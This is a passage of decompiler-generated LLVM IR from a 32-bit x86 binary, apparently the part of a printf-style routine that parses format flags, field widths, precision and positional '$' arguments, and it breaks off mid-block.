
dec_label_pc_804cbb7:                             ; preds = %dec_label_pc_804cbb1, %dec_label_pc_804cbad
  %v2_804cbbc = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_804cbd4.outer

dec_label_pc_804cbd4.outer:                       ; preds = %dec_label_pc_804cbb7, %dec_label_pc_804cb76, %dec_label_pc_804ccf1
  %v0_804cbe0.ph94 = phi i32 [ %v1_804ccf1, %dec_label_pc_804ccf1 ], [ %v2_804cb76, %dec_label_pc_804cb76 ], [ %v2_804cbbc, %dec_label_pc_804cbb7 ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_804ccf1 ], [ %tmp66, %dec_label_pc_804cb76 ], [ %tmp66, %dec_label_pc_804cbb7 ]
  %stack_var_-96.1.ph = phi i32 [ %v0_804cb7a, %dec_label_pc_804ccf1 ], [ 0, %dec_label_pc_804cb76 ], [ 0, %dec_label_pc_804cbb7 ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ccf1 ], [ %v3_804cb64, %dec_label_pc_804cb76 ], [ %v3_804cb64, %dec_label_pc_804cbb7 ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_804ccf1 ], [ 0, %dec_label_pc_804cb76 ], [ 0, %dec_label_pc_804cbb7 ]
  %v7_804cbdb = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_804cbdb = trunc i64 %v7_804cbdb to i32
  %v2_804cbe3 = add i32 %v8_804cbdb, 80
  br label %dec_label_pc_804cbd4

dec_label_pc_804cbd4:                             ; preds = %dec_label_pc_804cbd4.outer, %dec_label_pc_804cc91
  %v0_804cbe0 = phi i32 [ %v0_804cc9e, %dec_label_pc_804cc91 ], [ %v0_804cbe0.ph94, %dec_label_pc_804cbd4.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_804cc91 ], [ %stack_var_-32.1.ph, %dec_label_pc_804cbd4.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_804cc91 ], [ %stack_var_-88.1.ph, %dec_label_pc_804cbd4.outer ]
  store i32 %v0_804cbe0, i32* @edx, align 4
  %v1_804cbd4 = inttoptr i32 %v0_804cbe0 to i8*
  %v2_804cbd4 = load i8, i8* %v1_804cbd4, align 1
  %v11_804cbd4 = icmp eq i8 %v2_804cbd4, 42
  store i32 %v0_804cbe0, i32* @esi, align 4
  %v1_804cbd9 = icmp eq i1 %v11_804cbd4, false
  br i1 %v1_804cbd9, label %dec_label_pc_804cbeb, label %dec_label_pc_804cbdb

dec_label_pc_804cbdb:                             ; preds = %dec_label_pc_804cbd4
  store i32 %v8_804cbdb, i32* %eax.global-to-local, align 4
  %v1_804cbe0 = add i32 %v0_804cbe0, 1
  store i32 %v1_804cbe0, i32* @esi, align 4
  %v0_804cbe3 = load i32, i32* @esp, align 4
  %v3_804cbe3 = add i32 %v2_804cbe3, %v0_804cbe3
  %v4_804cbe3 = inttoptr i32 %v3_804cbe3 to i32*
  store i32 0, i32* %v4_804cbe3, align 4
  %v0_804cc05.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804cbeb

dec_label_pc_804cbeb:                             ; preds = %dec_label_pc_804cbd4, %dec_label_pc_804cbdb
  %v0_804cc05.pre = phi i32 [ %v0_804cbe0, %dec_label_pc_804cbd4 ], [ %v0_804cc05.pre.pre, %dec_label_pc_804cbdb ]
  %v0_804cbeb = load i32, i32* inttoptr (i32 134571072 to i32*), align 64
  store i32 %v0_804cbeb, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_804cc05.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cc05

dec_label_pc_804cbf5:                             ; preds = %dec_label_pc_804cc05
  %v1_804cbf5 = add i32 %v1_804cbfd, -4094
  %v6_804cbf5 = sub i32 4093, %v1_804cbfd
  %v7_804cbf5 = and i32 %v6_804cbf5, %v1_804cbfd
  %v8_804cbf5 = icmp slt i32 %v7_804cbf5, 0
  %v9_804cbf5 = icmp eq i32 %v1_804cbf5, 0
  %v10_804cbf5 = icmp slt i32 %v1_804cbf5, 0
  %v3_804cbfb = icmp eq i1 %v10_804cbf5, %v8_804cbf5
  %v4_804cbfb = icmp eq i1 %v9_804cbf5, false
  %v5_804cbfb = and i1 %v4_804cbfb, %v3_804cbfb
  br i1 %v5_804cbfb, label %dec_label_pc_804cc04, label %dec_label_pc_804cbfd

dec_label_pc_804cbfd:                             ; preds = %dec_label_pc_804cbf5
  %v3_804cbfd = mul i32 %v1_804cbfd, 10
  store i32 %v3_804cbfd, i32* %eax.global-to-local, align 4
  %v2_804cc00 = add i32 %v3_804cbfd, -48
  %v3_804cc00 = add i32 %v2_804cc00, %v2_804cc07
  store i32 %v3_804cc00, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cc04

dec_label_pc_804cc04:                             ; preds = %dec_label_pc_804cbf5, %dec_label_pc_804cbfd
  %v0_804cc1f32 = phi i32 [ %v1_804cbfd, %dec_label_pc_804cbf5 ], [ %v3_804cc00, %dec_label_pc_804cbfd ]
  %v4_804cc0528 = phi i32 [ %v6_804cc05, %dec_label_pc_804cbf5 ], [ %v3_804cbfd, %dec_label_pc_804cbfd ]
  %v1_804cc04 = add i32 %v0_804cc04, 1
  store i32 %v1_804cc04, i32* @esi, align 4
  br label %dec_label_pc_804cc05

dec_label_pc_804cc05:                             ; preds = %dec_label_pc_804cbeb, %dec_label_pc_804cc04
  %v1_804cbfd = phi i32 [ 0, %dec_label_pc_804cbeb ], [ %v0_804cc1f32, %dec_label_pc_804cc04 ]
  %v4_804cc05 = phi i32 [ %v4_804cc05.pre, %dec_label_pc_804cbeb ], [ %v4_804cc0528, %dec_label_pc_804cc04 ]
  %v0_804cc04 = phi i32 [ %v0_804cc05.pre, %dec_label_pc_804cbeb ], [ %v1_804cc04, %dec_label_pc_804cc04 ]
  %v1_804cc05 = inttoptr i32 %v0_804cc04 to i8*
  %v2_804cc05 = load i8, i8* %v1_804cc05, align 1
  %v3_804cc05 = zext i8 %v2_804cc05 to i32
  %v5_804cc05 = and i32 %v4_804cc05, -256
  %v6_804cc05 = or i32 %v3_804cc05, %v5_804cc05
  store i32 %v6_804cc05, i32* %eax.global-to-local, align 4
  %v2_804cc07 = sext i8 %v2_804cc05 to i32
  store i32 %v2_804cc07, i32* @ecx, align 4
  %v2_804cc0a = mul nsw i32 %v2_804cc07, 2
  %v3_804cc0a = add i32 %v2_804cc0a, %v0_804cbeb
  %v4_804cc0a = inttoptr i32 %v3_804cc0a to i8*
  %v5_804cc0a = load i8, i8* %v4_804cc0a, align 1
  %v6_804cc0a = and i8 %v5_804cc0a, 8
  %v7_804cc0a = icmp eq i8 %v6_804cc0a, 0
  %v1_804cc0f = icmp eq i1 %v7_804cc0a, false
  br i1 %v1_804cc0f, label %dec_label_pc_804cbf5, label %dec_label_pc_804cc11

dec_label_pc_804cc11:                             ; preds = %dec_label_pc_804cc05
  %v0_804cc11 = load i32, i32* @edx, align 4
  %v1_804cc11 = add i32 %v0_804cc11, -1
  %v2_804cc11 = inttoptr i32 %v1_804cc11 to i8*
  %v3_804cc11 = load i8, i8* %v2_804cc11, align 1
  %v12_804cc11 = icmp eq i8 %v3_804cc11, 37
  %v1_804cc15 = icmp eq i1 %v12_804cc11, false
  br i1 %v1_804cc15, label %dec_label_pc_804cca8, label %dec_label_pc_804cc1b

dec_label_pc_804cc1b:                             ; preds = %dec_label_pc_804cc11
  %v10_804cc1b = icmp eq i8 %v2_804cc05, 36
  %v1_804cc1d = icmp eq i1 %v10_804cc1b, false
  br i1 %v1_804cc1d, label %dec_label_pc_804cc4f, label %dec_label_pc_804cc1f

dec_label_pc_804cc1f:                             ; preds = %dec_label_pc_804cc1b
  %tmp89 = icmp slt i32 %v1_804cbfd, 1
  br i1 %tmp89, label %dec_label_pc_804cc4f, label %dec_label_pc_804cc23

dec_label_pc_804cc23:                             ; preds = %dec_label_pc_804cc1f
  %v4_804cc23 = icmp eq i32 %stack_var_-88.1, 0
  %v1_804cc28 = add i32 %v0_804cc04, 1
  store i32 %v1_804cc28, i32* @edx, align 4
  br i1 %v4_804cc23, label %dec_label_pc_804cef9, label %dec_label_pc_804cc31

dec_label_pc_804cc31:                             ; preds = %dec_label_pc_804cc23
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_804cc39 = sub i32 %v1_804cbfd, %stack_var_-88.1
  %v8_804cc39 = xor i32 %v1_804cbfd, %stack_var_-88.1
  %v9_804cc39 = xor i32 %v2_804cc39, %v1_804cbfd
  %v10_804cc39 = and i32 %v9_804cc39, %v8_804cc39
  %v11_804cc39 = icmp slt i32 %v10_804cc39, 0
  %v12_804cc39 = icmp eq i32 %v2_804cc39, 0
  %v13_804cc39 = icmp slt i32 %v2_804cc39, 0
  %v3_804cc3b = icmp ne i1 %v13_804cc39, %v11_804cc39
  %v4_804cc3b = or i1 %v12_804cc39, %v3_804cc3b
  %stack_var_-88.1.v0_804cc3d = select i1 %v4_804cc3b, i32 %stack_var_-88.1, i32 %v1_804cbfd
  br label %dec_label_pc_804cc4b

dec_label_pc_804cc4b:                             ; preds = %dec_label_pc_804cc5f, %dec_label_pc_804cc31, %dec_label_pc_804cc63
  %v0_804cc4b = phi i32 [ %v1_804cc28, %dec_label_pc_804cc31 ], [ %v0_804cc11, %dec_label_pc_804cc63 ], [ %v0_804cc11, %dec_label_pc_804cc5f ]
  %stack_var_-32.2 = phi i32 [ %v1_804cbfd, %dec_label_pc_804cc31 ], [ %stack_var_-32.1, %dec_label_pc_804cc63 ], [ %stack_var_-32.1, %dec_label_pc_804cc5f ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_804cc3d, %dec_label_pc_804cc31 ], [ 0, %dec_label_pc_804cc63 ], [ 0, %dec_label_pc_804cc5f ]
  store i32 %v0_804cc4b, i32* @esi, align 4
  br label %dec_label_pc_804cc72

dec_label_pc_804cc4f:                             ; preds = %dec_label_pc_804cc1f, %dec_label_pc_804cc1b
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_804cc5f, label %dec_label_pc_804cc56

dec_label_pc_804cc56:                             ; preds = %dec_label_pc_804cc4f
  %v10_804cc56 = icmp eq i8 %v2_804cc05, 109
  br i1 %v10_804cc56, label %dec_label_pc_804cca8, label %dec_label_pc_804cef9

dec_label_pc_804cc5f:                             ; preds = %dec_label_pc_804cc4f
  %tmp153 = icmp ugt i32 %v0_804cc04, %v0_804cc11
  br i1 %tmp153, label %dec_label_pc_804cc63, label %dec_label_pc_804cc4b

dec_label_pc_804cc63:                             ; preds = %dec_label_pc_804cc5f
  %v1_804cc63 = inttoptr i32 %v0_804cc11 to i8*
  %v2_804cc63 = load i8, i8* %v1_804cc63, align 1
  %v8_804cc63 = icmp eq i8 %v2_804cc63, 48
  br i1 %v8_804cc63, label %dec_label_pc_804cc4b, label %dec_label_pc_804cca8

dec_label_pc_804cc72:                             ; preds = %dec_label_pc_804cc83, %dec_label_pc_804cc4b
  %v0_804cc9e = phi i32 [ %v1_804cc83, %dec_label_pc_804cc83 ], [ %v0_804cc4b, %dec_label_pc_804cc4b ]
  %v4_804cc7c35 = phi i32 [ %v6_804cc7c, %dec_label_pc_804cc83 ], [ %v6_804cc05, %dec_label_pc_804cc4b ]
  store i32 ptrtoint ([8 x i8]* @global_var_8053af6.127 to i32), i32* %edx.global-to-local, align 4
  %v1_804cc7f = inttoptr i32 %v0_804cc9e to i8*
  br label %dec_label_pc_804cc7c

dec_label_pc_804cc7c:                             ; preds = %dec_label_pc_804cc8d, %dec_label_pc_804cc72
  %v4_804cc7c = phi i32 [ %v4_804cc7c35, %dec_label_pc_804cc72 ], [ %v6_804cc7c, %dec_label_pc_804cc8d ]
  %v0_804cc7e = phi i32 [ ptrtoint ([8 x i8]* @global_var_8053af6.127 to i32), %dec_label_pc_804cc72 ], [ %v1_804cc7e, %dec_label_pc_804cc8d ]
  %v0_804cc8d = phi i32 [ 1, %dec_label_pc_804cc72 ], [ %v2_804cc8d, %dec_label_pc_804cc8d ]
  store i32 %v0_804cc8d, i32* @ecx, align 4
  %v1_804cc7c = inttoptr i32 %v0_804cc7e to i8*
  %v2_804cc7c = load i8, i8* %v1_804cc7c, align 1
  %v3_804cc7c = zext i8 %v2_804cc7c to i32
  %v5_804cc7c = and i32 %v4_804cc7c, -256
  %v6_804cc7c = or i32 %v3_804cc7c, %v5_804cc7c
  store i32 %v6_804cc7c, i32* %eax.global-to-local, align 4
  %v1_804cc7e = add i32 %v0_804cc7e, 1
  store i32 %v1_804cc7e, i32* @edx, align 4
  %v2_804cc7f = load i8, i8* %v1_804cc7f, align 1
  %v15_804cc7f = icmp eq i8 %v2_804cc7f, %v2_804cc7c
  %v1_804cc81 = icmp eq i1 %v15_804cc7f, false
  br i1 %v1_804cc81, label %dec_label_pc_804cc88, label %dec_label_pc_804cc83

dec_label_pc_804cc83:                             ; preds = %dec_label_pc_804cc7c
  %v1_804cc83 = add i32 %v0_804cc9e, 1
  store i32 %v1_804cc83, i32* @esi, align 4
  %v0_804cc84 = load i32, i32* %edi.global-to-local, align 4
  %v2_804cc84 = or i32 %v0_804cc84, %v0_804cc8d
  store i32 %v2_804cc84, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804cc72

dec_label_pc_804cc88:                             ; preds = %dec_label_pc_804cc7c
  %v1_804cc88 = inttoptr i32 %v1_804cc7e to i8*
  %v2_804cc88 = load i8, i8* %v1_804cc88, align 1
  %v3_804cc88 = icmp eq i8 %v2_804cc88, 0
  br i1 %v3_804cc88, label %dec_label_pc_804cc91, label %dec_label_pc_804cc8d

dec_label_pc_804cc8d:                             ; preds = %dec_label_pc_804cc88
  %v2_804cc8d = mul i32 %v0_804cc8d, 2
  br label %dec_label_pc_804cc7c

dec_label_pc_804cc91:                             ; preds = %dec_label_pc_804cc88
  %v0_804cc91 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804cc95 = udiv i32 %v0_804cc91, 2
  %v1_804cc95.not = or i32 %v1_804cc95, -6
  %v1_804cc9a = xor i32 %v1_804cc95.not, 5
  store i32 %v1_804cc9a, i32* %eax.global-to-local, align 4
  %v2_804cc9c = and i32 %v1_804cc9a, %v0_804cc91
  store i32 %v2_804cc9c, i32* %edi.global-to-local, align 4
  %v1_804cc9e = add i32 %v0_804cc9e, -1
  %v2_804cc9e = inttoptr i32 %v1_804cc9e to i8*
  %v3_804cc9e = load i8, i8* %v2_804cc9e, align 1
  %v12_804cc9e = icmp eq i8 %v3_804cc9e, 37
  %v1_804cca2 = icmp eq i1 %v12_804cc9e, false
  br i1 %v1_804cca2, label %dec_label_pc_804cbd4, label %dec_label_pc_804cca8

dec_label_pc_804cca8:                             ; preds = %dec_label_pc_804cc63, %dec_label_pc_804cc91, %dec_label_pc_804cc11, %dec_label_pc_804cc56
  %v0_804cccb = phi i32 [ %v1_804cbfd, %dec_label_pc_804cc56 ], [ %v1_804cbfd, %dec_label_pc_804cc63 ], [ 0, %dec_label_pc_804cc91 ], [ %v1_804cbfd, %dec_label_pc_804cc11 ]
  %v1_804ccd4 = phi i32 [ %v0_804cc04, %dec_label_pc_804cc56 ], [ %v0_804cc04, %dec_label_pc_804cc63 ], [ %v0_804cc9e, %dec_label_pc_804cc91 ], [ %v0_804cc04, %dec_label_pc_804cc11 ]
  %v0_804ccd1 = phi i32 [ %v0_804cc11, %dec_label_pc_804cc56 ], [ %v0_804cc11, %dec_label_pc_804cc63 ], [ %v1_804cc7e, %dec_label_pc_804cc91 ], [ %v0_804cc11, %dec_label_pc_804cc11 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_804cc56 ], [ %stack_var_-32.1, %dec_label_pc_804cc63 ], [ %stack_var_-32.2, %dec_label_pc_804cc91 ], [ %stack_var_-32.1, %dec_label_pc_804cc11 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_804cc56 ], [ 0, %dec_label_pc_804cc63 ], [ %stack_var_-88.2, %dec_label_pc_804cc91 ], [ %stack_var_-88.1, %dec_label_pc_804cc11 ]
  %v1_804cca8 = inttoptr i32 %v0_804ccd1 to i8*
  %v2_804cca8 = load i8, i8* %v1_804cca8, align 1
  %v11_804cca8 = icmp eq i8 %v2_804cca8, 42
  %v1_804ccab = icmp eq i1 %v11_804cca8, false
  br i1 %v1_804ccab, label %dec_label_pc_804cce1, label %dec_label_pc_804ccad

dec_label_pc_804ccad:                             ; preds = %dec_label_pc_804cca8
  %v4_804ccad = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_804ccad, label %dec_label_pc_804ccd1, label %dec_label_pc_804ccb4

dec_label_pc_804ccb4:                             ; preds = %dec_label_pc_804ccad
  %v1_804ccb4 = inttoptr i32 %v1_804ccd4 to i8*
  %v2_804ccb4 = load i8, i8* %v1_804ccb4, align 1
  %v11_804ccb4 = icmp eq i8 %v2_804ccb4, 36
  %v1_804ccb7 = icmp eq i1 %v11_804ccb4, false
  br i1 %v1_804ccb7, label %dec_label_pc_804cef9, label %dec_label_pc_804ccbd

dec_label_pc_804ccbd:                             ; preds = %dec_label_pc_804ccb4
  %tmp91 = icmp slt i32 %v0_804cccb, 1
  br i1 %tmp91, label %dec_label_pc_804cef9, label %dec_label_pc_804ccc5

dec_label_pc_804ccc5:                             ; preds = %dec_label_pc_804ccbd
  store i32 %v8_804cbdb, i32* %eax.global-to-local, align 4
  %v1_804ccca = add i32 %v1_804ccd4, 1
  store i32 %v1_804ccca, i32* @esi, align 4
  %v1_804cccb = load i32, i32* @esp, align 4
  %v3_804cccb = add i32 %v8_804cbdb, 68
  %v4_804cccb = add i32 %v3_804cccb, %v1_804cccb
  %v5_804cccb = inttoptr i32 %v4_804cccb to i32*
  store i32 %v0_804cccb, i32* %v5_804cccb, align 4
  %v0_804cd0f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804ccdc

dec_label_pc_804ccd1:                             ; preds = %dec_label_pc_804ccad
  %v1_804ccd1 = add i32 %v0_804ccd1, 1
  store i32 %v1_804ccd1, i32* %eax.global-to-local, align 4
  %v12_804ccd4 = icmp eq i32 %v1_804ccd1, %v1_804ccd4
  %v1_804ccd6 = icmp eq i1 %v12_804ccd4, false
  br i1 %v1_804ccd6, label %dec_label_pc_804cef9, label %dec_label_pc_804ccdc

dec_label_pc_804ccdc:                             ; preds = %dec_label_pc_804ccd1, %dec_label_pc_804ccc5
  %v0_804cd0f.pre.pre.pre = phi i32 [ %v1_804ccd4, %dec_label_pc_804ccd1 ], [ %v0_804cd0f.pre.pre.pre.pre, %dec_label_pc_804ccc5 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804cce1

dec_label_pc_804cce1:                             ; preds = %dec_label_pc_804cca8, %dec_label_pc_804ccdc
  %v0_804cd0f.pre.pre = phi i32 [ %v1_804ccd4, %dec_label_pc_804cca8 ], [ %v0_804cd0f.pre.pre.pre, %dec_label_pc_804ccdc ]
  %v0_804cb7a = phi i32 [ %v0_804cccb, %dec_label_pc_804cca8 ], [ -2147483648, %dec_label_pc_804ccdc ]
  %v4_804cce1 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804cce1 = icmp eq i32 %v4_804cce1, 0
  %v1_804cce6 = icmp eq i1 %v5_804cce1, false
  %.pre = inttoptr i32 %v0_804cd0f.pre.pre to i8*
  br i1 %v1_804cce6, label %dec_label_pc_804cd0a, label %dec_label_pc_804ccec

dec_label_pc_804ccec:                             ; preds = %dec_label_pc_804cce1
  %v2_804ccec = load i8, i8* %.pre, align 1
  %v11_804ccec = icmp eq i8 %v2_804ccec, 46
  %v1_804ccef = icmp eq i1 %v11_804ccec, false
  br i1 %v1_804ccef, label %dec_label_pc_804cd03, label %dec_label_pc_804ccf1

dec_label_pc_804ccf1:                             ; preds = %dec_label_pc_804ccec
  %v1_804ccf1 = add i32 %v0_804cd0f.pre.pre, 1
  store i32 %v1_804ccf1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804cbd4.outer

dec_label_pc_804cd03:                             ; preds = %dec_label_pc_804ccec
  br label %dec_label_pc_804cd0a

dec_label_pc_804cd0a:                             ; preds = %dec_label_pc_804cce1, %dec_label_pc_804cd03
  %stack_var_-96.2 = phi i32 [ %v0_804cb7a, %dec_label_pc_804cd03 ], [ %stack_var_-96.1.ph, %dec_label_pc_804cce1 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804cd03 ], [ %v0_804cb7a, %dec_label_pc_804cce1 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8053aa4.128 to i32), i32* @edx, align 4
  %v4_804cd0f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804cd0f

dec_label_pc_804cd0f:                             ; preds = %dec_label_pc_804cd19, %dec_label_pc_804cd0a
  %v0_804cd19 = phi i32 [ %v1_804cd19, %dec_label_pc_804cd19 ], [ ptrtoint ([9 x i8]* @global_var_8053aa4.128 to i32), %dec_label_pc_804cd0a ]
  %v4_804cd0f = phi i32 [ %v6_804cd0f, %dec_label_pc_804cd19 ], [ %v4_804cd0f.pre, %dec_label_pc_804cd0a ]
  %v2_804cd0f = load i8, i8* %.pre, align 1
  %v3_804cd0f = zext i8 %v2_804cd0f to i32
  %v5_804cd0f = and i32 %v4_804cd0f, -256
  %v6_804cd0f = or i32 %v3_804cd0f, %v5_804cd0f
  store i32 %v6_804cd0f, i32* %eax.global-to-local, align 4
  %v3_804cd11 = inttoptr i32 %v0_804cd19 to i8*
  %v4_804cd11 = load i8, i8* %v3_804cd11, align 1
  %v15_804cd11 = icmp eq i8 %v2_804cd0f, %v4_804cd11
  br i1 %v15_804cd11, label %dec_label_pc_804cb81, label %dec_label_pc_804cd19

dec_label_pc_804cd19:                             ; preds = %dec_label_pc_804cd0f
  %v1_804cd19 = add i32 %v0_804cd19, 1
  store i32 %v1_804cd19, i32* @edx, align 4
  %v1_804cd1a = inttoptr i32 %v1_804cd19 to i8*
  %v2_804cd1a = load i8, i8* %v1_804cd1a, align 1
  %v3_804cd1a = icmp eq i8 %v2_804cd1a, 0
  %v1_804cd1d = icmp eq i1 %v3_804cd1a, false
  br i1 %v1_804cd1d, label %dec_label_pc_804cd0f, label %dec_label_pc_804cd1f

dec_label_pc_804cd1f:                             ; preds = %dec_label_pc_804cd19, %dec_label_pc_804cb81
  %v0_804cd32 = phi i32 [ %v1_804cb81, %dec_label_pc_804cb81 ], [ %v0_804cd0f.pre.pre, %dec_label_pc_804cd19 ]
  %v0_804cd2f = phi i32 [ %v0_804cd19, %dec_label_pc_804cb81 ], [ %v1_804cd19, %dec_label_pc_804cd19 ]
  %v1_804cd21 = add i32 %v0_804cd2f, -134560420
  %v1_804cd26 = add i32 %v0_804cd2f, -134560421
  %v5_804cd26 = sub i32 134560420, %v0_804cd2f
  %v6_804cd26 = and i32 %v1_804cd21, %v5_804cd26
  %v7_804cd26 = icmp slt i32 %v6_804cd26, 0
  %v8_804cd26 = icmp eq i32 %v1_804cd26, 0
  %v9_804cd26 = icmp slt i32 %v1_804cd26, 0
  store i32 %v1_804cd26, i32* %eax.global-to-local, align 4
  %v3_804cd27 = icmp eq i1 %v9_804cd26, %v7_804cd26
  %v4_804cd27 = icmp eq i1 %v8_804cd26, false
  %v5_804cd27 = and i1 %v4_804cd27, %v3_804cd27
  br i1 %v5_804cd27, label %dec_label_pc_804cd33, label %dec_label_pc_804cd29

dec_label_pc_804cd29:                             ; preds = %dec_label_pc_804cd1f
  %v1_804cd29 = inttoptr i32 %v0_804cd32 to i8*
  %v2_804cd29 = load i8, i8* %v1_804cd29, align 1
  %v3_804cd29 = zext i8 %v2_804cd29 to i32
  %v5_804cd29 = and i32 %v1_804cd26, -256
  %v6_804cd29 = or i32 %v3_804cd29, %v5_804cd29
  store i32 %v6_804cd29, i32* %eax.global-to-local, align 4
  %v3_804cd2b = inttoptr i32 %v0_804cd2f to i8*
  %v4_804cd2b = load i8, i8* %v3_804cd2b, align 1
  %v15_804cd2b = icmp eq i8 %v2_804cd29, %v4_804cd2b
  %v1_804cd2d = icmp eq i1 %v15_804cd2b, false
  br i1 %v1_804cd2d, label %dec_label_pc_804cd33, label %dec_label_pc_804cd2f

dec_label_pc_804cd2f:                             ; preds = %dec_label_pc_804cd29
  %v1_804cd2f = add i32 %v0_804cd2f, 9
  store i32 %v1_804cd2f, i32* @edx, align 4
  %v1_804cd32 = add i32 %v0_804cd32, 1
  store i32 %v1_804cd32, i32* @esi, align 4
  br label %dec_label_pc_804cd33

dec_label_pc_804cd33:                             ; preds = %dec_label_pc_804cd29, %dec_label_pc_804cd1f, %dec_label_pc_804cd2f
  %v4_804cd37 = phi i32 [ %v6_804cd29, %dec_label_pc_804cd29 ], [ %v1_804cd26, %dec_label_pc_804cd1f ], [ %v6_804cd29, %dec_label_pc_804cd2f ]
  %v0_804cd37 = phi i32 [ %v0_804cd32, %dec_label_pc_804cd29 ], [ %v0_804cd32, %dec_label_pc_804cd1f ], [ %v1_804cd32, %dec_label_pc_804cd2f ]
  %v0_804cd33 = phi i32 [ %v0_804cd2f, %dec_label_pc_804cd29 ], [ %v0_804cd2f, %dec_label_pc_804cd1f ], [ %v1_804cd2f, %dec_label_pc_804cd2f ]
  %v1_804cd33 = add i32 %v0_804cd33, 9
  %v2_804cd33 = inttoptr i32 %v1_804cd33 to i8*
  %v3_804cd33 = load i8, i8* %v2_804cd33, align 1
  %v4_804cd33 = sext i8 %v3_804cd33 to i32
  store i32 %v4_804cd33, i32* %ebx.global-to-local, align 4
  %v1_804cd37 = inttoptr i32 %v0_804cd37 to i8*
  %v2_804cd37 = load i8, i8* %v1_804cd37, align 1
  %v3_804cd37 = zext i8 %v2_804cd37 to i32
  %v5_804cd37 = and i32 %v4_804cd37, -256
  %v6_804cd37 = or i32 %v3_804cd37, %v5_804cd37
  store i32 %v6_804cd37, i32* %eax.global-to-local, align 4
  %v2_804cd39 = mul nsw i32 %v4_804cd33, 256
  store i32 %v2_804cd39, i32* %ebx.global-to-local, align 4
  %v4_804cd3c = icmp eq i8 %v2_804cd37, 0
  br i1 %v4_804cd3c, label %dec_label_pc_804cef9, label %dec_label_pc_804cd44

dec_label_pc_804cd44:                             ; preds = %dec_label_pc_804cd33
  %v3_804cd44 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804cd44, i32* %edx.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_8053ae1.129 to i32), i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804cd4d

dec_label_pc_804cd4d:                             ; preds = %dec_label_pc_804cd9d, %dec_label_pc_804cd44
  %v0_804cd9d = phi i32 [ %v1_804cd9d, %dec_label_pc_804cd9d ], [ ptrtoint ([21 x i8]* @global_var_8053ae1.129 to i32), %dec_label_pc_804cd44 ]
  %v3_804cd4d = inttoptr i32 %v0_804cd9d to i8*
  %v4_804cd4d = load i8, i8* %v3_804cd4d, align 1
  %v15_804cd4d = icmp eq i8 %v2_804cd37, %v4_804cd4d
  %v1_804cd4f = icmp eq i1 %v15_804cd4d, false
  br i1 %v1_804cd4f, label %dec_label_pc_804cd9d, label %dec_label_pc_804cd51

dec_label_pc_804cd51:                             ; preds = %dec_label_pc_804cd4d
  %v1_804cd53 = add i32 %v0_804cd9d, -134560481
  store i32 %v1_804cd53, i32* %edx.global-to-local, align 4
  %v7_804cd5c = icmp sgt i32 %v1_804cd53, 17
  br i1 %v7_804cd5c, label %dec_label_pc_804cd5e, label %dec_label_pc_804cd67

dec_label_pc_804cd5e:                             ; preds = %dec_label_pc_804cd51
  %v1_804cd5e = add i32 %v0_804cd9d, -134560483
  store i32 %v1_804cd5e, i32* %eax.global-to-local, align 4
  %v3_804cd61 = and i32 %v2_804cd39, 1024
  %v4_804cd61 = icmp eq i32 %v3_804cd61, 0
  %v1_804cd64 = icmp eq i1 %v4_804cd61, false
  %v4_804cd64 = select i1 %v1_804cd64, i32 %v1_804cd5e, i32 %v1_804cd53
  store i32 %v4_804cd64, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cd67

dec_label_pc_804cd67:                             ; preds = %dec_label_pc_804cd51, %dec_label_pc_804cd5e
  %v0_804cd70 = phi i32 [ %v1_804cd53, %dec_label_pc_804cd51 ], [ %v4_804cd64, %dec_label_pc_804cd5e ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053ad7.130 to i32), i32* %ecx.global-to-local, align 4
  %v2_804cd70 = add i32 %tmp76, 32
  %v3_804cd70 = inttoptr i32 %v2_804cd70 to i32*
  store i32 %v0_804cd70, i32* %v3_804cd70, align 4
  %v0_804cd73.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804cd77.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804cd73

dec_label_pc_804cd73:                             ; preds = %dec_label_pc_804cd73, %dec_label_pc_804cd67
  %v0_804cd73 = phi i32 [ %v1_804cd73, %dec_label_pc_804cd73 ], [ %v0_804cd73.pre, %dec_label_pc_804cd67 ]
  %v1_804cd73 = add i32 %v0_804cd73, 1
  store i32 %v1_804cd73, i32* %ecx.global-to-local, align 4
  %v1_804cd74 = inttoptr i32 %v1_804cd73 to i8*
  %v2_804cd74 = load i8, i8* %v1_804cd74, align 1
  %v3_804cd74 = sext i8 %v2_804cd74 to i32
  store i32 %v3_804cd74, i32* %eax.global-to-local, align 4
